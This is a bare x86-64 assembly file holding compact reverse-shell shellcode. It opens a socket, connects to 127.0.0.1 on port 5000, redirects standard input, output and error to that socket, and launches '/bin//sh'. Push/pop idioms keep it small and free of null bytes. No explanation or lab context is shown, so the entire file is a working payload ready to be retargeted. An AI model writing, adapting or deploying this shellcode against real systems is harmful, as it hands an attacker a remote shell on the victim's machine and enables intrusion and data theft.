        .intel_syntax noprefix
        .globl _start
_start:
        push 41
        pop rax
        cdq
        push 2
        pop rdi
        push 1
        pop rsi
        syscall                 # socket
        xchg rdi, rax
        push 0x0100007f
        pushw 0x8813
        pushw 2
        mov rsi, rsp
        push 16
        pop rdx
        push 42
        pop rax
        syscall                 # connect
dup:
        push 3
        pop rsi
dup_loop:
        dec rsi
        push 33
        pop rax
        syscall
        jne dup_loop
exec_shell:
        push 59
        pop rax
        cdq
        push rdx
        movabs rbx, 0x68732f2f6e69622f
        push rbx
        mov rdi, rsp
        push rdx
        push rdi
        mov rsi, rsp
        syscall
